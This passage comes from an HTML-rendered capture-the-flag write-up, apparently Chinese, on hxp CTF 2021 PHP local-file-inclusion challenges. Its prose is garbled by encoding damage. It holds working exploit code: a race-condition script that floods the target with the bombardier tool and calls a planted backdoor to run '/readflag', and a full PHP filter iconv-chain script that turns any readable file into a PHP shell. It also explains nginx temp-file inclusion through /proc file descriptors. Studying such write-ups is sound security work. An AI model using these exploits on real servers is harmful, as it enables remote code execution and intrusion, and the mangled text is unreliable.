        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] starting delete worker'</span><span class="token punctuation">,</span> file<span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
        s <span class="token operator">=</span> f<span class="token triple-quoted-string string">"""bombardier -c 8 -d 3m '{url}?page={payload_encoded.decode()}&amp;reset=1' > /dev/null"""</span>
        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>s<span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>
    threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>worker<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> daemon<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>delete_worker<span class="token punctuation">,</span> daemon<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">while</span> <span class="token operator">not</span> done<span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span>
            <span class="token string">'page'</span><span class="token punctuation">:</span> <span class="token string">'/proc/sys/kernel/ns_last_pid'</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'[+] pid: {pid}'</span><span class="token punctuation">,</span> file<span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
        <span class="token keyword">if</span> int<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token punctuation">(</span>pid<span class="token operator">+</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>
            pid <span class="token operator">=</span> int<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">200</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'[+] pid overflow: {pid}'</span><span class="token punctuation">,</span> file<span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'pkill -9 -x bombardier'</span><span class="token punctuation">)</span>

        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>f<span class="token string">'{url}data/{backdoor_name}'</span><span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span>
            <span class="token string">'s'</span> <span class="token punctuation">:</span> secret<span class="token punctuation">,</span>
            <span class="token string">'c'</span><span class="token punctuation">:</span> f<span class="token string">'id; ls -l /; /readflag; rm {backdoor_name}'</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
            done <span class="token operator">=</span> <span class="token boolean">True</span>
            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'pkill -9 -x bombardier'</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>


        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> file<span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
</code></pre>
<p>ç›´æ¥ä¸Šäº†ä¸€ä¸ªå«bombardierçš„ç©æ„è¿›è¡Œçˆ†ç ´ï¼Œå¯èƒ½pythonçš„èƒ½åŠ›æ˜¯æœ‰æé™çš„å§ã€‚ã€‚ã€‚ç›´æ¥æœè¿™ä¸ªåå­—å‘ç°æ˜¯ä¸€å®¶åŠ æ‹¿å¤§çš„å…¬å¸ã€‚ã€‚ã€‚ç„¶åå†è®¤çœŸæœä¸€ä¸‹å‘ç°æ˜¯è¿™ä¸ªé¡¹ç›®ï¼Œè¿˜è‡ªå¸¦äº†å·²ç»ç¼–è¯‘å¥½çš„releaseï¼Œæ³ªç›®<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/codesenberg/bombardier">https://github.com/codesenberg/bombardier</a><br>ä¸è¿‡è¿˜æœ‰ä¸€äº›æœ¬åœ°éªŒè¯payloadçš„assertç¯èŠ‚ï¼Œå¯ä»¥å­¦ä¹ ä¸€ä¸‹</p>
<h2 id="includerâ€™s-revenge"><a href="#includerâ€™s-revenge" class="headerlink" title="includerâ€™s revenge"></a>includerâ€™s revenge</h2><p>å’Œä¸Šä¸€ä¸ªé¢˜å·®ä¸å¤šï¼Œåœ¨é…ç½®æ–‡ä»¶ä¸Šçš„é™åˆ¶ä¸€æ ·ï¼Œä¸è¿‡è¿å†™åŠŸèƒ½ä¹Ÿæ²¡äº†</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'read'</span> <span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'read'</span> <span class="token operator">?</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>å¯ä»¥è¯»æ–‡ä»¶æˆ–è€…åŒ…å«æ–‡ä»¶</p>
<h3 id="update-1"><a href="#update-1" class="headerlink" title="update"></a>update</h3><p>æœç„¶è¿™äº›åŠŸèƒ½éƒ½æ˜¯å‡çš„ï¼Œå®é™…åˆ©ç”¨æ–¹æ¡ˆä¸ºnginxé»˜è®¤é…ç½®ä¸‹åœ¨request bodyè¿‡å¤§æ—¶ä¼šç¼“å­˜request bodyåˆ°ä¸´æ—¶æ–‡ä»¶ä¸­ã€‚åªè¦å‘é€ä¸€ä¸ªè¶…é•¿å¹¶å¸¦æœ‰PHP shellçš„è¯·æ±‚ä½“åˆ°nginxæœåŠ¡å™¨ä¸Šï¼Œå°±æœ‰æœºä¼šå®ç°ä¸€ä¸ªå…¨æ–°çš„æ— é™„åŠ åŠŸèƒ½æœ¬åœ°æ–‡ä»¶åŒ…å«<br>è¯»åŠŸèƒ½å°±å½“ä¸å­˜åœ¨å§</p>
<p>è¿™é‡Œéœ€è¦è§£å†³çš„é—®é¢˜æœ‰å¤šä¸ª</p>
<h4 id="éš¾ç‚¹1"><a href="#éš¾ç‚¹1" class="headerlink" title="éš¾ç‚¹1"></a>éš¾ç‚¹1</h4><blockquote>
<p>client_body_buffer_size:<br>Sets buffer size for reading client request body. In case the request body is larger than the buffer, the whole body or only its part is written to a temporary file. By default, buffer size is equal to two memory pages. This is 8K on x86, other 32-bit platforms, and x86-64. It is usually 16K on other 64-bit platforms.</p>
</blockquote>
<p>å½“request bodyè¶…å‡ºå¦‚ä¸Šé™åˆ¶æ—¶ï¼Œå°±ä¼šåˆ›å»ºä¸´æ—¶æ–‡ä»¶<br>nginxæ˜¯ç”¨å¦‚ä¸‹æ–¹å¼åˆ›å»ºä¸´æ—¶æ–‡ä»¶çš„</p>
<pre class=" language-C"><code class="language-C">ngx_fd_t
ngx_open_tempfile(u_char *name, ngx_uint_t persistent, ngx_uint_t access)
{
    ngx_fd_t  fd;

    fd = open((const char *) name, O_CREAT|O_EXCL|O_RDWR,
              access ? access : 0600);

    if (fd != -1 && !persistent) {
        (void) unlink((const char *) name);
    }

    return fd;
}
</code></pre>
<p>åˆ›å»ºä¹‹åé©¬ä¸Šåˆ é™¤è¿™ä¸ªæ–‡ä»¶ï¼Œç„¶åæŠŠè¿™ä¸ªæ–‡ä»¶çš„fdè¿”å›å‡ºå»ï¼Œè¿™æ ·å­å°±èƒ½ä¸ç•™ç—•è¿¹çš„è·å¾—ä¸€ä¸ªå†…å­˜ä¸­çš„æ–‡ä»¶å¥æŸ„ï¼Œåœ¨å†…å­˜é‡Œè¿›è¡Œæ–‡ä»¶è¯»å†™æ“ä½œã€‚ï¼ˆè¯´èµ·æ¥æœ‰æ²¡æœ‰èƒ½ç›´æ¥æ‰“å¼€ä¸€ä¸ªåœ¨å†…å­˜ä¸­æ–‡ä»¶å¥æŸ„çš„å‡½æ•°å‘¢ï¼Ÿåº”è¯¥ä¼šæ¯”å»ºäº†åˆåˆ æ›´ä¼˜é›…å§ï¼Ÿï¼‰ ä¸”ä¸´æ—¶æ–‡ä»¶ä¸€èˆ¬ä¸º<code>/var/lib/nginx/body/000000xxxx</code>ï¼Œæ–‡ä»¶åæ˜¯ä¸€ä¸ªåä½å‘å·¦å¡«å……0çš„æ•°å­—ã€‚æ–‡ä»¶åçš„æ•°å­—éšç€nginxçš„è¯·æ±‚å¤„ç†å¢é•¿è€Œå¢é•¿ã€‚æƒ³è¦ç›´æ¥çˆ†ç ´å‡ºæ–‡ä»¶åä¹Ÿæ˜¾å¾—ä¸æ˜¯éå¸¸çš„å¯èƒ½ï¼Œæ›´ä¸ç”¨è¯´åœ¨çˆ†ç ´æ–‡ä»¶åçš„åŒæ—¶è¿˜è¦æ¡ä»¶ç«äº‰äº†ã€‚</p>
<p>ä¸ºäº†ç ”ç©¶ä¸€ä¸‹åˆ›å»ºæ–‡ä»¶é©¬ä¸Šåˆ æ‰ä¹‹åçš„è¡¨ç°ï¼Œæˆ‘å†™äº†ä¸€ä¸ªåƒåœ¾çš„Cä»£ç ï¼ˆè¯·å¿½ç•¥å„ç§ä¼šé€ æˆæº¢å‡ºçš„ä»£ç ï¼‰</p>
<pre class=" language-C"><code class="language-C">#include <unistd.h>
#include <sys types.h>
#include <sys stat.h>
#include <fcntl.h>
#include <stdio.h>

void main() {
    char buffer[128] = { 0 }, s[128] = { 0 }, name[32] = {0};
    printf("Enter a name :");
    gets(name);
    int fd = open((const char*)name, O_CREAT | O_EXCL | O_RDWR, 0600);

    if (fd != -1) {
        (void)unlink((const char*)name);
    }


    printf("Enter a value :");
    gets(s);

    write(fd, s, sizeof(s));

    lseek(fd, 0, SEEK_SET);
    printf("Wait for input\n");
    getchar();

    read(fd, buffer, sizeof(buffer));
    printf("%s", buffer);
}
</stdio.h></fcntl.h></sys></sys></unistd.h></code></pre>
<p>ä¹Ÿå°±æ˜¯æ¨¡ä»¿ä»–çš„æ“ä½œï¼Œæ–°å¼€ä¸€ä¸ªæ–‡ä»¶ç„¶åé©¬ä¸Šåˆ æ‰ï¼Œå†å¯¹è¿™ä¸ªæ–‡ä»¶çš„fdè¿›è¡Œè¯»å†™æ“ä½œï¼Œçœ‹ä¼šå‘ç”Ÿä»€ä¹ˆã€‚</p>
<pre class=" language-bash"><code class="language-bash">root@myserver:~/test<span class="token comment" spellcheck="true"># ./main</span>
Enter a name :testfile
fd is 3
Enter a value :aaaaaaaaaaaa
Wait <span class="token keyword">for</span> input
d
aaaaaaaaaaaa
</code></pre>
<p>åœ¨wait for inputæ—¶æ–°å¼€ä¸€ä¸ªç»ˆç«¯</p>
<pre class=" language-bash"><code class="language-bash">root@myserver:/proc/20006/fd<span class="token comment" spellcheck="true"># ps aux | grep main</span>
postgres   592  0.0  0.7 294704 14388 ?        S     2021   7:03 /usr/lib/postgresql/9.5/bin/postgres -D /var/lib/postgresql/9.5/main -c config_file<span class="token operator">=</span>/etc/postgresql/9.5/main/postgresql.conf
root     20148  0.0  0.0   4356   644 pts/0    S+   11:33   0:00 ./main
root     20153  0.0  0.0  14228   956 pts/1    S+   11:33   0:00 <span class="token function">grep</span> --color<span class="token operator">=</span>auto main
root@myserver:/proc/20006/fd<span class="token comment" spellcheck="true"># cd /proc/20148/fd</span>
root@myserver:/proc/20148/fd<span class="token comment" spellcheck="true"># ll</span>
total 0
dr-x------ 2 root root  0 Jan  5 11:33 ./
dr-xr-xr-x 9 root root  0 Jan  5 11:33 <span class="token punctuation">..</span>/
lrwx------ 1 root root 64 Jan  5 11:33 0 -<span class="token operator">></span> /dev/pts/0
lrwx------ 1 root root 64 Jan  5 11:33 1 -<span class="token operator">></span> /dev/pts/0
lrwx------ 1 root root 64 Jan  5 11:33 2 -<span class="token operator">></span> /dev/pts/0
lrwx------ 1 root root 64 Jan  5 11:33 3 -<span class="token operator">></span> /root/test/testfile <span class="token punctuation">(</span>deleted<span class="token punctuation">)</span>
root@myserver:/proc/20148/fd<span class="token comment" spellcheck="true"># cat 3</span>
aaaaaaaaaaaaroot@myserver:/proc/20148/fd<span class="token comment" spellcheck="true">#</span>
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨å¯¹åº”è¿›ç¨‹çš„procç›®å½•ä¸‹ï¼Œå­˜åœ¨å¯¹åº”çš„fdé¡¹ç›®ï¼Œä¸”ä¸ºä¸€ä¸ªè½¯é“¾æ¥ï¼Œè¿æ¥åˆ°<code>/root/test/testfile (deleted)</code>ï¼Œè¡¨æ˜è¯¥æ–‡ä»¶å·²è¢«åˆ é™¤ï¼Œä½†ä»ç„¶å¯ä»¥ç»§ç»­å†™å…¥å¹¶è¯»å‡º</p>
<p>å› æ­¤ï¼Œåªè¦èƒ½æ‰¾åˆ°å¯¹åº”çš„nginx workerçº¿ç¨‹ï¼Œå¹¶å°è¯•çˆ†ç ´å‡ºè¯¥ä¸´æ—¶æ–‡ä»¶çš„fdï¼Œå°±å¯ä»¥å¯¹æˆ‘ä»¬å‘é€çš„payloadè¿›è¡ŒåŒ…å«ã€‚è¿™æ ·çš„æ“ä½œåŒæ ·ç»•è¿‡äº†nginxä¸´æ—¶æ–‡ä»¶ç¼–å·ä¸å¯é¢„çŸ¥çš„é™åˆ¶ï¼Œä¸”è¯¥fdåœ¨nginxå¤„ç†è¯¥è¯·æ±‚æ—¶ä¼šä¸€ç›´å­˜åœ¨ï¼Œä¹Ÿæ”¾å®½äº†æ¡ä»¶ç«äº‰çš„éš¾åº¦ï¼ˆæ—¢ç„¶å¦‚æ­¤ï¼Œèƒ½ä¸èƒ½æ‰‹å†™socketå¡ä½è¿™ä¸ªæ‰§è¡Œï¼Œè®©è¿™ä¸ªfdé•¿æ—¶é—´çš„å­˜åœ¨å‘¢ï¼Ÿä¸è¿‡è¿™æ ·å­ä¹Ÿå°±è¦æ±‚nginxåœ¨æ”¶åˆ°çš„è¯·æ±‚å¤§äºé™åˆ¶æ—¶å°±è¿›è¡Œå†™å…¥ï¼Œè€Œä¸æ˜¯æ”¶åˆ°å®Œæ•´è¯·æ±‚åå†åˆ¤æ–­å¤§å°è¿›è¡Œå†™å…¥ï¼Œä¸çŸ¥é“å…·ä½“æ˜¯æ€ä¹ˆå¤„ç†çš„ï¼‰</p>
<h4 id="éš¾ç‚¹2"><a href="#éš¾ç‚¹2" class="headerlink" title="éš¾ç‚¹2"></a>éš¾ç‚¹2</h4><p>è™½ç„¶pastençš„wpä¸­æåˆ°procä¸­çš„æ–‡ä»¶æ—¢è¡¨ç°çš„åƒè½¯é“¾æ¥åˆè¡¨ç°çš„åƒç¡¬é“¾æ¥ï¼Œä½†lsä¸€ä¸‹çš„è¯æ˜¾ç¤ºçš„æ–‡ä»¶ç±»å‹è¿˜æ˜¯è½¯é“¾æ¥ã€‚<br>å¯¹äºè½¯é“¾æ¥æ–‡ä»¶ï¼ŒPHPä¼šå°è¯•å…ˆå¯¹è½¯é“¾æ¥è¿›è¡Œè§£æï¼Œå†å°†å…¶æ‰“å¼€ã€‚<br>è€Œè¿™é‡Œæœ‰ä¸€ä¸ªæœ‰æ„æ€çš„ä¸œè¥¿</p>
<blockquote>
<p>If a file was deleted while a process holds an open file descriptor:</p>
</blockquote>
<p>realpath() will return the last path of the file with â€œ (deleted)â€ appended to it.<br>open() will return an fd that can be used to read the original file content.</p>
<p>è§£æè½¯é“¾æ¥ä¼šå¾—åˆ°é‚£ä¸ªå¸¦(deleted)çš„ç»“æœï¼Œè¿™ä¸ªæ—¶å€™å†å»openå°±ä¼šå¤±è´¥ï¼Œå› æ­¤ï¼Œè¿™ä¸ªç«äº‰éœ€è¦åœ¨æ–‡ä»¶åˆ›å»ºä½†è¿˜æœªåˆ é™¤çš„ä¸¤è¡Œä»£ç çš„å¤¹ç¼ä¸­è‰°éš¾ç”Ÿå­˜ã€‚<br>é™¤æ­¤ä¹‹å¤–ï¼ŒPHPå¯¹äºè½¯é“¾æ¥çš„è§£æè¿˜æœ‰ä¸€å±‚ç¼“å­˜</p>
<pre><code>realpath_cache_size default 4M
realpath_cahce_ttl default 120s
</code></pre>
<p>ä¸€æ¬¡è§£æå¤±è´¥ï¼Œå°±èƒ½å¯¼è‡´æ¥ä¸‹æ¥ä¸¤åˆ†é’Ÿçš„è§£æç›´æ¥èµ°çš„ç¼“å­˜å†…å®¹ï¼Œæ— æ³•ç»§ç»­ç«äº‰ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œåˆä½¿ç”¨äº†<code>/proc/$PID/root</code>å’Œ<code>/proc/$PID/cwd</code>ä¸¤ä¸ªç›®å½•è½®æµåµŒå¥—ï¼Œä½¿å¾—æ¯æ¬¡çš„è·¯å¾„éƒ½æ˜¯å…¨æ–°çš„è·¯å¾„ï¼Œä¸ä¼šè¿›å…¥ç¼“å­˜<br>ç„¶åå°±æ˜¯é«˜å¼ºåº¦ç«äº‰ç¯èŠ‚äº†ã€‚å¯èƒ½æ ¹æ®Pastenæˆ˜é˜Ÿçš„è¯´æ³•ï¼Œä¸€èˆ¬çš„ç”µè„‘ç«äº‰ä¸åŠ¨ï¼Œå¾—åŠ é’± :(</p>
<h5 id="å®˜æ–¹ç»•è¿‡è½¯é“¾æ¥æ–¹æ¡ˆ"><a href="#å®˜æ–¹ç»•è¿‡è½¯é“¾æ¥æ–¹æ¡ˆ" class="headerlink" title="å®˜æ–¹ç»•è¿‡è½¯é“¾æ¥æ–¹æ¡ˆ"></a>å®˜æ–¹ç»•è¿‡è½¯é“¾æ¥æ–¹æ¡ˆ</h5><p>å‡ºé¢˜äººæå‡ºäº†å¦ä¸€ç§ç»•è¿‡PHPè§£æè½¯é“¾æ¥çš„æ–¹æ³•ï¼Œç›´æ¥åŠ ä¸€å±‚ç›¸å¯¹ç›®å½•è·³èµ·æ¥ï¼Œå°±èƒ½é˜²æ­¢PHPå¯¹è½¯é“¾æ¥è¿›è¡Œè§£æï¼ˆå¯èƒ½æ˜¯å› ä¸ºæºç ä¸­è§£æç›¸å¯¹è·¯å¾„å’Œè§£æè½¯é“¾æ¥çš„é€»è¾‘æ˜¯äº’æ–¥çš„ï¼Ÿï¼‰<br>è¿™æ ·å­æ¡ä»¶ç«äº‰çš„éš¾åº¦å°±å¤§å¹…ä¸‹é™äº†ï¼Œåªè¦èƒ½ç«äº‰åˆ°procä¸­çš„fdå³å¯å®ŒæˆåŒ…å«<br>å¤§æ¦‚å°±æ˜¯è¿™ä¸ªæ ·å­<br><code>/proc/self/fd/34/../../../34/fd/9</code></p>
<h5 id="å­¦ä¸€äº›å…¶ä»–çš„æ“ä½œ"><a href="#å­¦ä¸€äº›å…¶ä»–çš„æ“ä½œ" class="headerlink" title="å­¦ä¸€äº›å…¶ä»–çš„æ“ä½œ"></a>å­¦ä¸€äº›å…¶ä»–çš„æ“ä½œ</h5><p>æ‰«<code>/proc/$PID/cmdline</code>æ¥ç¡®å®šè¿›ç¨‹æ˜¯å¦æ˜¯nginx workerè¿›ç¨‹ï¼Œ<code>/proc/cpuinfo</code>çœ‹CPUæœ‰å‡ ä¸ªæ ¸ï¼Œ<code>/proc/sys/kernel/pid_max</code>çœ‹æœ€å¤§pidæ˜¯å¤šå°‘ï¼Œç¡®å®šæ‰«æèŒƒå›´</p>
<h4 id="LFIçš„æœ€ç»ˆé€šæ€"><a href="#LFIçš„æœ€ç»ˆé€šæ€" class="headerlink" title="LFIçš„æœ€ç»ˆé€šæ€"></a>LFIçš„æœ€ç»ˆé€šæ€</h4><p>åœ¨èµ›åæœ‰ä¸€ä¸ªå¸ˆå‚…æå‡ºäº†åœ¨ä¸ç•™ä¸‹æ–‡ä»¶çš„æƒ…å†µä¸‹åŒ…å«PHP shellï¼Œè€Œåˆ©ç”¨çš„æ¡ä»¶ä»…ä»…æ˜¯å­˜åœ¨ä¸€ä¸ªå¯è¯»çš„æ–‡ä»¶<br>ä½¿ç”¨PHP filterçš„iconvå­—ç¬¦è½¬æ¢åŠŸèƒ½ï¼Œé€šè¿‡éå¸¸ç©¶æçš„æ’åˆ—ç»„åˆï¼Œå®Œæˆäº†ä»ä»»æ„å­—ç¬¦ä¸²è½¬æ¢åˆ°ä¸€ä¸ªPHPshellçš„åŠŸèƒ½<br>è¿™ä¸ªæ˜¯ä¸æ˜¯æ— æ•Œäº†å•Šï¼Ÿå½“æ–‡ä»¶åå®Œå…¨å¯æ§æ—¶ï¼Œæ–‡ä»¶å†…å®¹ä¹Ÿå°±çº¦ç­‰äºå®Œå…¨å¯æ§äº†<br>å…·ä½“æ–‡ç« å’Œè„šæœ¬å¦‚ä¸‹<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">Solving â€œincluderâ€™s revengeâ€ from hxp ctf 2021 without controlling any files</a></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://localhost/index.php"</span>
file_to_use <span class="token operator">=</span> <span class="token string">"/etc/passwd"</span>
command <span class="token operator">=</span> <span class="token string">"/readflag"</span>

<span class="token comment" spellcheck="true">#&lt;?=`$_GET[0]`;;?></span>
base64_payload <span class="token operator">=</span> <span class="token string">"PD89YCRfR0VUWzBdYDs7Pz4"</span>

conversions <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'R'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2'</span><span class="token punctuation">,</span>
    <span class="token string">'B'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2'</span><span class="token punctuation">,</span>
    <span class="token string">'C'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR'</span><span class="token punctuation">,</span>
    <span class="token string">'8'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2'</span><span class="token punctuation">,</span>
    <span class="token string">'9'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB'</span><span class="token punctuation">,</span>
    <span class="token string">'f'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213'</span><span class="token punctuation">,</span>
    <span class="token string">'s'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61'</span><span class="token punctuation">,</span>
    <span class="token string">'z'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS'</span><span class="token punctuation">,</span>
    <span class="token string">'U'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932'</span><span class="token punctuation">,</span>
    <span class="token string">'P'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213'</span><span class="token punctuation">,</span>
    <span class="token string">'V'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5'</span><span class="token punctuation">,</span>
    <span class="token string">'0'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2'</span><span class="token punctuation">,</span>
    <span class="token string">'Y'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2'</span><span class="token punctuation">,</span>
    <span class="token string">'W'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2'</span><span class="token punctuation">,</span>
    <span class="token string">'d'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2'</span><span class="token punctuation">,</span>
    <span class="token string">'D'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2'</span><span class="token punctuation">,</span>
    <span class="token string">'7'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2'</span><span class="token punctuation">,</span>
    <span class="token string">'4'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2'</span>
<span class="token punctuation">}</span>


<span class="token comment" spellcheck="true"># generate some garbage base64</span>
filters <span class="token operator">=</span> <span class="token string">"convert.iconv.UTF8.CSISO2022KR|"</span>
filters <span class="token operator">+=</span> <span class="token string">"convert.base64-encode|"</span>
<span class="token comment" spellcheck="true"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span>
filters <span class="token operator">+=</span> <span class="token string">"convert.iconv.UTF8.UTF7|"</span>


<span class="token keyword">for</span> c <span class="token keyword">in</span> base64_payload<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        filters <span class="token operator">+=</span> conversions<span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"|"</span>
        <span class="token comment" spellcheck="true"># decode and reencode to get rid of everything that isn't valid base64</span>
        filters <span class="token operator">+=</span> <span class="token string">"convert.base64-decode|"</span>
        filters <span class="token operator">+=</span> <span class="token string">"convert.base64-encode|"</span>
        <span class="token comment" spellcheck="true"># get rid of equal signs</span>
        filters <span class="token operator">+=</span> <span class="token string">"convert.iconv.UTF8.UTF7|"</span>

filters <span class="token operator">+=</span> <span class="token string">"convert.base64-decode"</span>

final_payload <span class="token operator">=</span> f<span class="token string">"php://filter/{filters}/resource={file_to_use}"</span>

r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span>
    <span class="token string">"0"</span><span class="token punctuation">:</span> command<span class="token punctuation">,</span>
    <span class="token string">"action"</span><span class="token punctuation">:</span> <span class="token string">"include"</span><span class="token punctuation">,</span>
    <span class="token string">"file"</span><span class="token punctuation">:</span> final_payload
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre>
